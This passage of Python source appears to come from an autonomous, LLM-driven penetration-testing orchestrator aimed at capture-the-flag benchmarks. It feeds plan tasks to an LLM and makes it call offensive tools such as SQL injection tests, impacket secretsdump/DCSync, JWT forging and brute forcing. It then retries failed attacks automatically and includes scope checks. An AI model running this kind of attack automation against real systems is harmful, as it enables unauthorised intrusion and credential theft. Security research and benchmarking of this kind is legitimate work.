            match = re.search(r"(?:path[_ -]?id|attack path)[:= ]+([\w.-]+)",
                              task.instruction or "", re.I)
            path_id = match.group(1) if match else ""
        if not path_id:
            return
        prior = next((p for p in self.dkg.attack_path_states()
                      if p.get("path_id") == path_id), {})
        confidence = float(prior.get("confidence", 0.5) or 0.5)
        status = str(prior.get("status", "active"))
        if success:
            confidence = min(1.0, confidence + 0.05)
        elif failure_type in {"hypothesis_rejected", "strategy_failed"}:
            confidence = max(0.0, confidence - 0.2)
            if confidence <= 0.2:
                status = "rejected"
        elif failure_type == "defense_blocked":
            confidence = max(0.0, confidence - 0.1)
            if confidence <= 0.2:
                status = "stale"
        self.dkg.upsert_attack_path(
            path_id, confidence=confidence, status=status,
            evidence=[failure_type] if failure_type else ["success"] if success else [],
        )
        log.debug(
            "attack path feedback: path_id=%s confidence=%.2f status=%s",
            path_id, confidence, status,
        )

    # ── Tool Result Feedback ─────────────────────────────────────

    EXPLOIT_TOOLS = {"sqlmap_test", "send_payload", "command_injection_test",
                     "xss_reflection_test", "ffuf_fuzz", "http_post",
                     "redis_cmd", "mysql_query", "psql_query", "mssql_query", "mssqlclient_query",
                     "oracle_query", "tomcat_exploit", "php_filter_chain",
                     "jwt_forge", "impacket_psexec", "impacket_wmiexec",
                     "impacket_pth", "impacket_ticketer", "impacket_silver_ticket",
                     "impacket_secretsdump", "impacket_secretsdump_dcsync",
                     "impacket_GetUserSPNs", "impacket_GetNPUsers", "wpscan_enum"}

    @staticmethod
    def _format_parse_summary(parsed: dict) -> str:
        """Convert parse_response output to a compact (<800 char) string."""
        lines = []
        ct = parsed.get("type", "?")
        size = parsed.get("size_bytes", 0)
        if size > 1048576:
            size_str = f"{size / 1048576:.1f}MB"
        elif size > 1024:
            size_str = f"{size / 1024:.1f}KB"
        else:
            size_str = f"{size}B"
        lines.append(f"Type={ct}, Size={size_str}")

        flags = parsed.get("flags", [])
        if flags:
            lines.append(f"FLAGS={flags}")

        if ct == "html":
            if parsed.get("title"):
                lines.append(f"Title: {parsed['title'][:80]}")
            lines.append(f"Forms={parsed.get('forms',0)} Inputs={parsed.get('inputs',0)} Links={parsed.get('links_count',0)}")
            apis = parsed.get("api_paths", [])
            if apis:
                lines.append(f"API: {' '.join(apis[:8])[:180]}")
            eps = parsed.get("endpoints", [])
            if eps:
                lines.append(f"EP: {' '.join(eps[:10])[:200]}")
            sc = parsed.get("scripts", [])
            if sc:
                lines.append(f"JS: {' '.join(sc[:5])[:150]}")
        elif ct == "json":
            tlk = parsed.get("top_level_keys")
            if tlk:
                lines.append(f"Keys: {tlk}")
            iv = parsed.get("interesting_values", [])
            for item in iv[:5]:
                lines.append(f"  [{item['path']}]: {item['value'][:80]}")
        elif ct == "text":
            urls = parsed.get("urls", [])
            if urls:
                lines.append(f"URLs: {' '.join(urls[:6])}")
            jwts = parsed.get("jwt_tokens", [])
            if jwts:
                lines.append(f"JWT: {jwts[:3]}")

        result = "\n".join(lines)
        return result[:800]

    def _format_tool_feedback(
        self, tc_name: str, tc_args: dict, result, defence_probe: str = ""
    ) -> str:
        """Format a tool execution result into structured feedback for the LLM.

        Gives the LLM clear status, stdout, stderr, and defense probe findings.
        """
        status = "SUCCESS" if (hasattr(result, 'success') and result.success) else "FAILED"
        exit_code = getattr(result, 'exit_code', '?')
        stdout = getattr(result, 'stdout', '') or ''
        stderr = getattr(result, 'stderr', '') or ''
        elapsed = getattr(result, 'elapsed_ms', 0)

        # Detect timeout (empty output + failure)
        if status == "FAILED" and not stdout and not stderr:
            status = "TIMEOUT"

        parts = [
            f"[TOOL: {tc_name}]",
            f"STATUS: {status} (exit={exit_code}, {elapsed}ms)",
            f"ARGS: {json.dumps(tc_args, default=str)[:200]}",
        ]
        if stdout:
            # Info-gathering tools need more room — wpscan plugin lists,
            # nmap results, and RAG knowledge often exceed 1500 chars.
            _INFO_TOOLS = {"wpscan_enum", "knowledge_search", "nmap_port_range",
                           "nmap_full_scan", "nikto_scan", "dirb_scan",
                           "gobuster_dir", "nvd_search_cves", "searchsploit_search",
                           "metasploit_search", "go_exploitdb_search",
                           "ddg_web_search"}
            _stdout_limit = 5000 if tc_name in _INFO_TOOLS else 1500
            parts.append(f"STDOUT: {stdout[:_stdout_limit]}")
        if stderr:
            parts.append(f"STDERR: {stderr[:500]}")
        if not stdout and not stderr:
            parts.append("(no output)")
        if defence_probe:
            parts.append(defence_probe)

        # Auto-parse: for large or structured responses, append a compact summary.
        # curl_get / http_post responses > 5000 bytes often contain HTML or JSON
        # that gets truncated at 1500 chars — parse_response extracts the structure.
        _PARSABLE_TOOLS = {"curl_get", "http_post"}
        if (stdout and tc_name in _PARSABLE_TOOLS and len(stdout) > 5000
                and status == "SUCCESS"):
            try:
                content_type = "auto"
                # If the response includes HTTP headers, try Content-Type hint
                if stdout.startswith("HTTP/"):
                    ct_match = re.search(r'Content-Type:\s*(\S+)', stdout, re.I)
                    if ct_match:
                        ct_val = ct_match.group(1).lower()
                        if "html" in ct_val:
                            content_type = "html"
                        elif "json" in ct_val:
                            content_type = "json"
                parsed = parse_response(stdout, content_type=content_type)
                summary = self._format_parse_summary(parsed)
                if summary:
                    parts.append(f"PARSED SUMMARY:\n{summary}")
            except Exception as exc:
                log.debug("swallowed exception (best-effort, never break feedback): %s", exc, exc_info=True)

        return "\n".join(parts)

    # Per-vuln-type probe payloads for defense detection
    # NOTE: per-task defense probing and automatic payload-bypass retries
    # were removed.  They issued 2-5 extra requests per exploit task and,
    # across the whole benchmark suite, never produced a flag — the only
    # measurable effect was reporting a 403 AccessDenied response as an
    # active WAF.  Defense awareness now comes from the single recon-time
    # DPM pass in ReconCoordinator._detect_defenses().

    # ── Unified LLM-Driven Loop (v2: LLM drives EVERYTHING) ──────────

    async def _execute_task_with_policies(
        self,
        task: Task,
        tool_defs: list[dict],
        iteration: int = 0,
        max_iter: int = 25,
    ) -> "TaskExecution":
        """Execute one plan task with all orchestrator post-processing (P15 2b).

        Shared by the legacy loop and the Runtime-driven path: direct/LLM
        tool-call selection, execution via the Executor, adaptive format
        retry, blacklist/absent-service tracking, defense probe + bypass,
        fix-and-retry, credential extraction and local-first replan. The
        LLM plan review is left to the caller.
        """
        execution = TaskExecution(success=False, result_text="")

        # O1.2: capture the world-state before this task runs so the plan
        # review LLM can see exactly what this task discovered (added
        # Endpoint/Vulnerability/Credential/Session/Flag/Service nodes).
        try:
            self._cognition_before = node_ids_by_type(self.dkg)
        except Exception:
            self._cognition_before = None
        try:
            self._topology_before = self.dkg.topology_snapshot()
        except Exception:
            self._topology_before = None

        task_instruction = task.instruction or "unknown"
        task_action = task.action or {}
        task_tool = str(task_action.get("tool", "") or "")
        task_params = task_action.get("params", {}) or {}
        # LLM can produce params as a JSON string — normalize to dict
        if isinstance(task_params, str):
            try:
                task_params = json.loads(task_params)
            except (json.JSONDecodeError, TypeError):
                task_params = {"url": str(task_params)}
        if not isinstance(task_params, dict):
            task_params = {"value": task_params}

        # ── Plan-first execution ─────────────────────────────────────
        # The plan is authoritative: when it already carries every required
        # parameter for its tool, execute that tool directly through the
        # Executor instead of letting the LLM re-select a tool (which silently
        # replaced planned write calls such as PUT with unrelated read tools).
        # Only plans that are under-specified — or need creative argument
        # construction — fall through to the LLM-driven path.
        if task_tool == "ssrf_probe" and isinstance(task_params, dict):
            # Legacy plans used url/param; canonicalize only this migrated tool.
            if not task_params.get("ssrf_url") and task_params.get("url"):
                task_params["ssrf_url"] = task_params.pop("url")
            if not task_params.get("url_param") and task_params.get("param"):
                task_params["url_param"] = task_params.pop("param")
        _known_gateway_tools = set(self.attack_gateway.get_tool_names()) | set(
            self.recon_gateway.get_tool_names()
        )
        _direct_ok, _direct_missing = self._plan_params_complete(
            task_tool, task_params, _known_gateway_tools
        )
        if _direct_ok:
            # Execute directly — plan params are authoritative
            task_tool_calls = [{
                "name": task_tool, "arguments": task_params,
                "id": f"direct-{task.id}",
            }]
            print(f"\n[solo:{iteration}] task={task.id} → {task_tool} [direct]")
            log.info("task=%s tool=%s [direct] start (iteration=%d)",
                     task.id, task_tool, iteration)
            self._task_log_event("info", "execution_mode",
                                 task_id=task.id, mode="direct", tool=task_tool)
        else:
            # LLM-driven execution for flexible/exploratory tasks
            if task_tool and _direct_missing:
                log.info("task=%s tool=%s [llm] — missing required params %s",
                         task.id, task_tool, _direct_missing)
            self._task_log_event("info", "execution_mode",
                                 task_id=task.id, mode="llm", tool=task_tool,
                                 missing=list(_direct_missing))
            self._maybe_compress()
            if "-manual" in task.id:
                # Manual retry: force the LLM to use send_payload with the
                # tested param. History shows it tends to wander to other
                # endpoints otherwise.
                tu_val = task_params.get("url", task_params.get("target_url", ""))
                tp_val = task_params.get("param", task_params.get("parameter", "q"))
                freedom_note = (
                    f"You MUST call send_payload(url=\"{tu_val}\", param=\"{tp_val}\", "
                    f"payload=..., method=\"GET\"). "
                    f"Do NOT call curl_get or http_post instead. "
                    f"Do NOT change the URL or param. "
                    f"The instruction below contains specific payloads to try."
                )
            else:
                if task_tool and task_tool != "curl_get":
                    freedom_note = (
                        f"You MUST call the tool '{task_tool}' now. "
                        f"Do not substitute another tool. "
                        f"Use the exact params listed below. "
                        f"The instruction describes what to do with this tool."
                    )
                else:
                    freedom_note = (
                        f"You may use a different tool if you have a better approach, "
                        f"but you MUST target this task's objective."
                    )
            # Inject recent DKG artifacts so the LLM knows about
            # credentials/files/sessions discovered by prior tasks
            _recent_ctx = self._extract_recent_artifacts()
            # O1.3: unified cognition snapshot — facts, beliefs, plan and
            # rationale rendered from the current world model. This is what
            # keeps the execution-phase LLM aligned with the latest state
            # even after conversation history was compressed.
            _belief_ctx = self._belief_context()
            _topology_subgraph = ""
            try:
                _anchors = self._task_anchor_ids(task)
                if _anchors:
                    _snapshot = self.dkg.topology_snapshot(
                        anchor_ids=_anchors, max_hops=1, max_nodes=16, max_edges=24,
                    )
                    if _snapshot.get("nodes") or _snapshot.get("edges"):
                        _topology_subgraph = (
                            "\n## Task Topology\n"
                            + json.dumps(_snapshot, default=str)[:3000]
                        )
            except Exception:
                _topology_subgraph = ""
            task_prompt = (
                f"Execute plan task {iteration}/{max_iter}:\n"
                f"  Instruction: {task_instruction}\n"
                f"  Required tool: {task_tool if task_tool else '(choose the best tool)'}\n"
                f"  Params: {json.dumps(task_params)}\n"
                + (f"\n{_recent_ctx}\n" if _recent_ctx else "") +
                (f"\n{_belief_ctx}\n" if _belief_ctx else "") +
                (f"{_topology_subgraph}\n" if _topology_subgraph else "") +
                f"\n{freedom_note}"
            )
            content, task_tool_calls = await self._llm_generate_async(
                prompt=task_prompt,
                system_prompt=SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
                tools=tool_defs,
                stage="task_execution",
            )

            if not task_tool_calls:
                # Retry once with more explicit instruction
                content2, task_tool_calls = await self._llm_generate_async(
                    prompt=f"You MUST call the tool '{task_tool}' now. "
                           f"Do not explain. Just execute the function call.",
                    system_prompt=SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
                    tools=tool_defs,
                    stage="task_execution",
                )
            if not task_tool_calls:
                log.info("[PLAN] task %s: LLM produced no tool calls — skipping",
                         task.id)
                task.status = TaskStatus.ABANDONED
                execution.skip = True
                execution.result_text = "LLM produced no tool calls"
                return execution
            tc_names = [tc.get('name', '?') for tc in task_tool_calls]
            print(f"\n[solo:{iteration}] task={task.id} → "
                  f"{', '.join(tc_names)}")
            log.info("task=%s tool(s)=%s start (iteration=%d)",
                     task.id, ", ".join(tc_names), iteration)

        # Execute tool calls for this task
        tc_names = [tc.get('name', '?') for tc in task_tool_calls]
        task_success = False  # at least one tool must succeed
        _any_success = False
        task_summary = ""
        _all_task_stdouts: list[str] = []  # accumulate all tool outputs (truncated)
        _raw_task_stdouts: list[str] = []  # full stdout for credential extraction
        # Executed calls (name/args/success/stdout) — success_condition and
        # plan-adherence checks read what actually ran, not what was planned.
        _executed_calls: list[dict] = []
        _auto_test_negative = False  # track "no evidence" / "no flag"
        _last_result = None
        # Review cadence: plan_review rewrites the whole plan, so it must be
        # justified by work that actually ran. This counter is reset whenever
        # a review (or plan generation) really happens.
        self._executions_since_review = (
            int(getattr(self, "_executions_since_review", 0) or 0) + 1
        )

        for tc in task_tool_calls:
            tc_name = tc.get("name", "")
            tc_args = tc.get("arguments", {})
            tc_id = tc.get("id", "")

            if self._time_exceeded():
                self.llm.add_tool_result(tc_id, "Skipped: time exceeded")
                continue

            self.step_count += 1

            # Auto-inject body_format for POST endpoints.
            # Only default to JSON when the endpoint's sample response
            # starts with { or [ (indicating a JSON API). Otherwise
            # keep the LLM's choice — cloud simulators (AWS STS/IAM)
            # and OIDC endpoints typically expect form-encoded data.
            if tc_name == "send_payload" and tc_args.get("method", "GET").upper() == "POST":
                if not tc_args.get("body_format"):
                    url = tc_args.get("url", "")
                    dkg_eps = [e for e in self.dkg.query_nodes("Endpoint")
                               if e.get("url", "") == url]
                    if dkg_eps:
                        _sample = (dkg_eps[0].get("sample_response") or "").strip()
                        if _sample.startswith("{") or _sample.startswith("["):
                            tc_args["body_format"] = "json"

            # Block local filesystem access — flag must come from the target
            if tc_name in ("curl_get", "http_post") and str(tc_args.get("url", "")).startswith("file://"):
                result = ToolResult(
                    tool_name=tc_name, success=False,
                    stdout="BLOCKED: file:// URLs search the local host, not the target. "
                           "Only interact with the target service.",
                    stderr="", exit_code=1, elapsed_ms=0,
                )
            elif tc_name == "docker_registry" and tc_args.get("target_registry"):
                from urllib.parse import urlparse
                registry = str(tc_args.get("target_registry", ""))
                parsed_registry = urlparse(
                    registry if "://" in registry else f"http://{registry}"
                )
                registry_host = parsed_registry.hostname or ""
                registry_port = parsed_registry.port or 5000
                discovered = any(
                    int(s.get("port", 0) or 0) == registry_port
                    for s in self.dkg.query_nodes("Service")
                ) or any(
                    urlparse(str(e.get("url", ""))).hostname == registry_host
                    and (urlparse(str(e.get("url", ""))).port or 80) == registry_port
                    for e in self.dkg.query_nodes("Endpoint")
                )
                if not discovered:
                    result = ToolResult(
                        tool_name=tc_name, success=False, stdout="",
                        stderr=(f"registry target {registry} is outside the discovered "
                                "network scope"), exit_code=2, elapsed_ms=0,
                    )
                else:
                    result = await self.executor.execute(
                        Task(
                            id=task.id or tc_id, type=task.type,
                            goal=task_instruction, instruction=task_instruction,
                            action={"tool": tc_name,
                                    "target": str(tc_args.get("target_registry", "")),
                                    "params": dict(tc_args)},
                            status=TaskStatus.RUNNING,
                        )
                    )
            else:
                # P5c: strict Task consumption — the Executor is the
                # only execution path. Post-processing below consumes
                # the normalized ExecutionResult fields unchanged.
                try:
                    result = await self.executor.execute(
                        Task(
                            id=task.id or tc_id,
                            type=task.type,
                            goal=task_instruction,
                            instruction=task_instruction,
                            action={
                                "tool": tc_name,
                                "target": str(
                                    tc_args.get("url", tc_args.get("target_url", ""))
                                ),
                                "params": dict(tc_args),
                            },
                            status=TaskStatus.RUNNING,
                        )
                    )
                except Exception as e:
                    result = CoreExecutionResult(
                        task_id=task.id or tc_id,
                        tool=tc_name,
                        planned_tool=tc_name,
                        adherence=True,
                        success=False,
                        stdout="",
                        stderr=str(e),
                        exit_code=1,
                        elapsed_ms=0.0,
                    )

            # P10/P11: execution history — feeds replan context and
            # the compression view (preserve/compress/discard).
            _last_result = result

            # ── Adaptive format retry ──────────────────────────
            # When send_payload/http_post gets HTTP 400 with one body
            # format, automatically retry with the opposite format.
            # Cloud API simulators (AWS STS/IAM/OIDC) often expect
            # form-encoded data while the LLM may have chosen JSON
            # (or vice versa). One retry costs ~2-5s but resolves
            # format mismatches without requiring the LLM to guess.
            if tc_name in ("send_payload", "http_post") and not result.success:
                _res_stderr = (getattr(result, 'stderr', '') or '').lower()
                _res_stdout = (getattr(result, 'stdout', '') or '').lower()
                if ("400" in _res_stderr or "bad request" in _res_stderr
                        or "400" in _res_stdout or "bad request" in _res_stdout):
                    _cur_format = tc_args.get("body_format", "")
                    if _cur_format == "json":
                        tc_args["body_format"] = "form"
                        try:
                            if tc_name in self.attack_gateway.get_tool_names():
                                result = await self._call_tool(tc_name, tc_args)
                            elif tc_name in self.recon_gateway.get_tool_names():
                                result = await self._call_tool(tc_name, tc_args)
                        except Exception as exc:
                            log.debug("swallowed exception (retry failed — keep original error): %s", exc, exc_info=True)
                    elif _cur_format in ("form", ""):
                        tc_args["body_format"] = "json"
                        try:
                            if tc_name in self.attack_gateway.get_tool_names():
                                result = await self._call_tool(tc_name, tc_args)
                            elif tc_name in self.recon_gateway.get_tool_names():
                                result = await self._call_tool(tc_name, tc_args)
                        except Exception as exc:
                            log.debug("swallowed exception (retry failed — keep original error): %s", exc, exc_info=True)

            # ── Runtime tool blacklist & absent-service tracking ──
            _exit_code = getattr(result, 'exit_code', 0)
            _stderr = (getattr(result, 'stderr', '') or '')
            _stdout = (getattr(result, 'stdout', '') or '')
            _combined = (_stdout + " " + _stderr).lower()
            # Detect missing binary (e.g. netexec not on PATH)
            if _exit_code == 127 and "not found" in _stderr:
                _match = re.search(r'/bin/[a-z]+sh:\s+\d+:\s+(\S+):\s+not found', _stderr)
                _missing_bin = _match.group(1).strip() if _match else ""
                if _missing_bin:
                    log.warning("Tool '%s' not found on PATH — blacklisting '%s'", _missing_bin, tc_name)
                    # Map to fallback if one exists (e.g. mssql_query→mssqlclient_query)
                    _TOOL_FALLBACK: dict[str, str] = {
                        "mssql_query": "mssqlclient_query",
                    }
                    _fallback = _TOOL_FALLBACK.get(tc_name, "")
                    self._BLACKLISTED_TOOLS[tc_name] = _fallback
                    if self.exploitation_plan and self.exploitation_plan.tasks:
                        self._sanitize_plan_tools(self.exploitation_plan.tasks)
                    # Auto-retry with fallback tool immediately
                    if _fallback:
                        log.info("Auto-retrying '%s' with fallback '%s'", tc_name, _fallback)
                        try:
                            if _fallback in self.attack_gateway.get_tool_names():
                                fallback_result = await self._call_tool(_fallback, tc_args)
                            elif _fallback in self.recon_gateway.get_tool_names():
                                fallback_result = await self._call_tool(_fallback, tc_args)
                            else:
                                fallback_result = None
                            if fallback_result and getattr(fallback_result, 'success', False):
                                result = fallback_result
                                tc_name = _fallback
                                log.info("Fallback '%s' succeeded", _fallback)
                            elif fallback_result:
                                log.info("Fallback '%s' also failed (exit=%s)",
                                         _fallback, getattr(fallback_result, 'exit_code', '?'))
                        except Exception as _fb_err:
                            log.warning("Fallback '%s' error: %s", _fallback, _fb_err)
            # Detect broken binaries: Go/C binaries that start but
            # can't parse their own flags (e.g. corrupt gobuster
            # binary that rejects -w and -u even when present).
            if (_exit_code not in (0, 127)
                    and "must be specified" in _combined
                    and tc_name not in self._BLACKLISTED_TOOLS):
                log.warning(
                    "Tool '%s' appears broken (binary rejects its own "
                    "flags) — blacklisting", tc_name
                )
                self._BLACKLISTED_TOOLS[tc_name] = ""
                if self.exploitation_plan and self.exploitation_plan.tasks:
                    self._sanitize_plan_tools(self.exploitation_plan.tasks)
            # Track unreachable targets
            _target = (tc_args.get("url", "") or tc_args.get("host", "")
                       or tc_args.get("target", "") or "")
            if _target:
                if (_exit_code == 7 and tc_name == "curl_get") or \
                   any(kw in _combined for kw in ("connection refused", "could not connect",
                                                   "no route to host", "can't connect")):
                    self._absent_services.add(_target)
            # Track absent DB services (Redis/MySQL/PG/Oracle probes)
            _DB_TOOLS = {"redis_cmd", "mysql_query", "psql_query", "mssql_query", "mssqlclient_query", "mssqlclient_query",
                         "oracle_query", "smbmap_enum"}
            if tc_name in _DB_TOOLS and not getattr(result, 'success', False):
                _host = tc_args.get("host", "")
                _port = tc_args.get("port", "")
                if _host:
                    _label = f"{_host}:{_port}" if _port else _host
                    self._absent_services.add(_label)

            # ── Trace: record final tool result (Execution Memory seed) ──
            self._task_log_event(
                "info", "tool_result",
                task_id=task.id,
                tool=tc_name,
                planned_tool=task_tool,
                adherence=(tc_name == task_tool),
                success=bool(getattr(result, "success", False)),
                exit_code=getattr(result, "exit_code", -1),
                elapsed_ms=getattr(result, "elapsed_ms", 0),
            )

            # Logging
            result_stdout = getattr(result, 'stdout', '') or ''
            result_exit = getattr(result, 'exit_code', -1)
            flags_found = self.flag_pattern.findall(result_stdout)
            if flags_found:
                log.info("[EXPLOIT] %s: FLAG FOUND %s", tc_name, flags_found[0])
                _any_success = True
            elif getattr(result, 'success', False):
                log.info("[EXPLOIT] %s: OK (exit=%d, %d bytes) — no flag",
                          tc_name, result_exit, len(result_stdout))
                _any_success = True
            else:
                log.info("[EXPLOIT] %s: FAILED (exit=%d) — %s",
                         tc_name, result_exit,
                         (result_stdout[:100]
                          or getattr(result, 'stderr', '')[:100]
                          or 'no output').replace('\n', ' '))

            # Format feedback for LLM
            tool_stdout = self._format_tool_feedback(tc_name, tc_args, result)
            if (tc_name == "file_upload" and not getattr(result, 'success', False)
                    and getattr(result, 'exit_code', 0) in (400, 403, 500)):
                tool_stdout += (
                    "\n[HINT: HTTP 4xx/5xx on file upload often means the endpoint "
                    "requires additional form fields (IDs, directories, nonces, tokens). "
                    "Look at the plugin documentation, readme, or error messages to "
                    "discover the required parameters. Retry with extra_fields={\"key\":\"value\",...}. "
                    "Common examples: eeSFL_ID (numeric list ID), eeSFL_FileUploadDir "
                    "(target directory), action (ajax action), nonce (CSRF token).]"
                )
            if (tc_name == "http_post" and not getattr(result, 'success', False)
                    and tc_args.get("url")):
                for ep in self.dkg.query_nodes("Endpoint"):
                    if ep.get("url") == tc_args.get("url") and ep.get("body_format") == "json":
                        tool_stdout += (
                            "\n[HINT: this endpoint expects JSON body. "
                            "Try content_type='application/json']"
                        )
                        break

            log.debug("  [%s] %s", tc_name, str(tc_args)[:120])
            # Direct execution tasks skip LLM history — no preceding
            # assistant tool_calls message exists, so adding a tool
            # result here would break DeepSeek's API requirement
            # ("Messages with role 'tool' must be a response to a
            #  preceding message with 'tool_calls'").
            # The fix mechanism (stderr-aware) handles param errors instead.
            if not tc_id.startswith("direct-"):
                _is_info = tc_name in ("wpscan_enum", "knowledge_search",
                    "nmap_port_range", "nmap_full_scan", "nikto_scan",
                    "dirb_scan", "gobuster_dir", "nvd_search_cves",
                    "searchsploit_search", "metasploit_search",
                    "go_exploitdb_search")
                _limit = 7000 if _is_info else 3000
                self.llm.add_tool_result(tc_id, tool_stdout[:_limit])

            # Auto-persist technology discoveries to DKG (before compression loses them)
            if tc_name in ("whatweb_scan",) and getattr(result, 'success', False):
                parsed = getattr(result, "parsed_output", {})
                _fingerprint = parsed.get("technologies", [])[:5]
                if _fingerprint:
                    # Enrich the existing nmap Service node with
                    # whatweb fingerprint — do NOT create fake
                    # port-0 Service nodes.
                    _ww_host = self.target_host
                    from urllib.parse import urlparse as _up3
                    _ww_url = tc_args.get("target_url", "")
                    _ww_parts = _up3(_ww_url) if _ww_url else None
                    if _ww_parts and _ww_parts.hostname:
                        _ww_host = _ww_parts.hostname
                    _ww_port = (_ww_parts.port if _ww_parts and _ww_parts.port
                                else 80)
                    _ww_svc_id = f"svc-{_ww_host}-{_ww_port}"
                    _ww_svc = self.dkg.get_node(_ww_svc_id)
                    if _ww_svc:
                        self.dkg.update_node(
                            _ww_svc_id,
                            {"fingerprint": _fingerprint},
                        )
            task_summary += f"{tc_name}: {'OK' if getattr(result,'success',False) else 'FAIL'}; "
            # Accumulate each tool's output for plan review context.
            # Include the file_upload HINT so the fix-and-retry LLM also
            # sees it (not just the plan-review LLM via tool_stdout).
            _out = getattr(result, 'stdout', '') or ''
            _err = getattr(result, 'stderr', '') or ''
            # Include stderr so the fix LLM can see parameter errors
            # (e.g. KeyError('host') when wrong param names are used)
            _combined = _out
            if _err:
                _err_short = _err[:400]
                _combined = f"{_out}\n[STDERR] {_err_short}"
            _hint = ""
            if (tc_name == "file_upload"
                    and not getattr(result, 'success', False)
                    and getattr(result, 'exit_code', 0) in (400, 403, 500)):
                _hint = (
                    " [HINT: HTTP 4xx/5xx on file upload often means "
                    "required form fields are missing. Retry with "
                    "extra_fields={'eeSFL_ID':'1','eeSFL_FileUploadDir':'/wp-content/uploads/'} "
                    "or similar plugin-specific parameters.]"
                )
            _all_task_stdouts.append(f"[{tc_name}] {_combined[:600]}{_hint}")
            _executed_calls.append({
                "name": tc_name,
                "args": dict(tc_args) if isinstance(tc_args, dict) else {},
                "success": bool(getattr(result, "success", False)),
                "stdout": getattr(result, "stdout", "") or "",
                "stderr": getattr(result, "stderr", "") or "",
                "method": _call_method(tc_name, tc_args),
            })
            # Track if automated test found nothing
            rl = (getattr(result, 'stdout', '') or '').lower()
            if "no evidence" in rl or "no flag" in rl:
                _auto_test_negative = True

            # CTEG tracking
            raw_stdout = getattr(result, 'stdout', '') or ''
            _raw_task_stdouts.append(raw_stdout)  # full, for credential extraction
            _TOOL_VULN_MAP = {
                "sqlmap_test": "SQLI", "xss_reflection_test": "XSS",
                "command_injection_test": "CMDI", "ffuf_fuzz": "FUZZ",
                "send_payload": "INJECTION", "hydra_http_brute": "AUTH",
                "hydra_ssh_brute": "AUTH",
                "ssrf_probe": "ssrf",
            }
            self._exploit_chain.append({
                "tool": tc_name,
                "url": str(tc_args.get("url", tc_args.get("target_url", ""))),
                "method": str(tc_args.get("method", "GET")),
                "param": str(tc_args.get("param", tc_args.get("parameter", ""))),
                "params": str(tc_args)[:200], "result": raw_stdout[:200],
                "vuln_type": _TOOL_VULN_MAP.get(tc_name, tc_name),
                "mechanism": tc_name,
            })

            # Flag check
            flags = self.flag_pattern.findall(result_stdout)
            if flags:
                is_valid, reason = await self._verify_flag(
                    flags[0], result_stdout, tc_args, getattr(result, "elapsed_ms", 0),
                    tool_name=tc_name,
                )
                if is_valid:
                    self._persist_verified_flag(
                        flags[0], str(tc_args.get("url", tc_args.get("target_url", ""))),
                        "exploit-tool",
                    )
                    self.phase = OrchestratorPhase.DONE
                    execution.flag_result = TaskResult(
                        success=True, flag=flags[0], steps=self.step_count,
                        tokens_used=self._tokens_used(),
                        time_elapsed=time.time() - self.start_time,
                    )
                    self._verified_flag_result = execution.flag_result
                    return execution
                log.warning("Flag candidate rejected by verifier: %s", reason)

        # ── Identity propagation ────────────────────────────────────────
        # A denied read plus a disclosed caller identity is a complete
        # authorisation recipe on this class of API; try it before declaring
        # the task failed.
        if not execution.flag_result:
            try:
                _identity_flag = await self._probe_identity_propagation(_executed_calls)
            except Exception as exc:
                log.warning("identity propagation probe failed: %s", exc)
                _identity_flag = None
            if _identity_flag:
                self._persist_verified_flag(
                    _identity_flag,
                    str(task_params.get("url", task_params.get("target_url", "")) or "")
                    or task_instruction,
                    "identity-propagation",
                )
                self.phase = OrchestratorPhase.DONE
                execution.flag_result = TaskResult(
                    success=True, flag=_identity_flag,
                    steps=self.step_count,
                    tokens_used=self._tokens_used(),
                    time_elapsed=time.time() - self.start_time,
                )
                self._verified_flag_result = execution.flag_result
                return execution

        # ── success_condition: judge the task by its observable goal ─────
        # Falling back to "any tool returned exit 0" let a substituted read
        # tool masquerade as a completed write task.
        _condition = (
            dict(task.success_condition)
            if isinstance(getattr(task, "success_condition", None), dict)
            else {}
        )
        if not _condition and _planned_write_intent(task_tool, task_params):
            _condition = {"type": "tool_success", "tool": task_tool,
                          "method": _call_method(task_tool, task_params)}
        _condition_detail = ""
        if _condition:
            _cond_met, _condition_detail = await self._verify_success_condition(
                _condition,
                _executed_calls,
                _any_success,
                bool(execution.flag_result),
            )
            if not _cond_met:
                task_success = False
                log.info("[CONDITION] task=%s not met — %s", task.id, _condition_detail)
            else:
                task_success = _any_success
            self._task_log_event(
                "info", "success_condition",
                task_id=task.id,
                condition=_condition,
                met=bool(_cond_met),
                detail=_condition_detail,
            )
        else:
            task_success = _any_success

        # O2.1: positive belief feedback — a successful task raises the
        # confidence of the matching vulnerability hypothesis.
        try:
            if task_success:
                self._apply_vulnerability_feedback(
                    task, success=True,
                    flag_found=bool(execution.flag_result),
                )
                self._apply_attack_path_feedback(task, success=True)
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)
        task_result_text = self._summarize_task_result(
            tc_names, task_success, _all_task_stdouts
        )
        if not task_success and _condition_detail:
            task_result_text = (
                f"[SUCCESS CONDITION NOT MET] {_condition_detail}\n{task_result_text}"
            )

        # ── Deterministic route-variant retry (write intent) ─────────
        # A wrong path SHAPE (collection route vs detail route) answers
        # 404/405 even when the verb is right. Retry the SAME method against
        # neighbour paths derived from identifiers already observed, instead
        # of spending an LLM round-trip guessing the same thing.
        if (not task_success
                and _planned_write_intent(task_tool, task_params)
                and _last_http_status(_executed_calls) in _ROUTE_VARIANT_STATUSES):
            _variant_base = str(
                task_params.get("url", task_params.get("target_url", "")) or ""
            )
            _variant_text = " ".join(
                str(c.get("stdout", "") or "") for c in _executed_calls
            )
            _variant_method = _call_method(task_tool, task_params)
            for _variant_url in route_variants(
                _variant_base, self._route_identifiers(task_params, _variant_text),
            ):
                _variant_args = dict(task_params)
                if "url" in _variant_args or "target_url" not in _variant_args:
                    _variant_args["url"] = _variant_url
                else:
                    _variant_args["target_url"] = _variant_url
                try:
                    _variant_result = await self._call_tool(task_tool, _variant_args)
                except Exception as exc:
                    log.warning("route variant probe failed for %s: %s", _variant_url, exc)
                    continue
                _variant_stdout = str(getattr(_variant_result, "stdout", "") or "")
                _variant_status = _http_status_of(_variant_stdout)
                self.step_count += 1
                self._task_log_event(
                    "info", "route_variant_probe", task_id=task.id,
                    url=_variant_url, method=_variant_method,
                    status=_variant_status,
                    success=bool(getattr(_variant_result, "success", False)),
                )
                self._record_route_probe(_variant_url, _variant_method, _variant_status)
                _all_task_stdouts.append(f"[{task_tool}] {_variant_stdout[:600]}")
                _executed_calls.append({
                    "name": task_tool,
                    "args": dict(_variant_args),
                    "success": bool(getattr(_variant_result, "success", False)),
                    "stdout": _variant_stdout,
                    "stderr": getattr(_variant_result, "stderr", "") or "",
